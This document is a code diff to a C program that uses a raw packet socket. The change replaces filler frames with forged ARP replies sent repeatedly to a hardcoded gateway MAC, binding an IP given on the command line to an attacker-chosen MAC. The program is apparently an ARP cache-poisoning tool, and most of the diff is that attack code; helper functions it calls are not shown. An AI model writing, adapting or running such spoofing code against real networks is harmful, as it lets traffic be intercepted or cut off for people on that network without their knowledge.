@@ -15,23 +15,22 @@
 int main(int c, char *z[])
 {
 	int	packet_socket;
-	errn1(packet_socket = socket(AF_PACKET, SOCK_RAW, 0xcccc), "socket error");
+	errn1(packet_socket = socket(AF_PACKET, SOCK_RAW, rev2(0x0806)), "socket error");
 	struct sockaddr_ll	sa_ll;
 	sa_ll.sll_family = AF_PACKET, sa_ll.sll_halen = 6, sa_ll.sll_ifindex = get_ifindex(packet_socket, "eth0");
-	strcpy(sa_ll.sll_addr, "\xcc\xcc\xcc\xcc\xcc\xcc");
-	char	msg[1514], mac_src[6];
-	conv_mac(z[2], mac_src);
+	char	gate[] = "\x00\xe0\xfc\x6a\xa6\xd0";
 	int	i;
 	for (i=0;i<6;i++)
-		msg[i]=0xcc, msg[6+i]=mac_src[i];
-	*((short*)(msg+12)) = 0xcccc;
-	*((int*)(msg+14)) = 0xcccccccc;
+		sa_ll.sll_addr[i] = gate[i];
+	char	msg[1514], mac_src[6];
+	conv_mac(z[2], mac_src);
+	int	len = mk_arp_reply_packet(msg, gate, mac_src, 0, conv_ip(z[1]), 1);
 	struct timespec	t;
 	int	cnt, packet_sent = 0;
 	sscanf(z[3], "%d", &cnt);
 	t.tv_sec = 0, t.tv_nsec = 1000000000/cnt;
 	while (1) {
-		errn1(sendto(packet_socket, msg, 18, 0, (struct sockaddr*)&sa_ll, sizeof(struct sockaddr_ll)), "sendto error");
+		errn1(sendto(packet_socket, msg, len, 0, (struct sockaddr*)&sa_ll, sizeof(struct sockaddr_ll)), "sendto error");
 		packet_sent++;
 		if (packet_sent == 60 * cnt) {
 			#ifdef DEBUG
@@ -59,6 +58,7 @@ int main(int c, char *z[])
 				#endif
 				char	new_mac[6];
 				conv_mac(ans, new_mac);
+				int	i;
 				for (i=0;i<6;i++)
 					if (new_mac[i] != msg[6+i])
 						break;
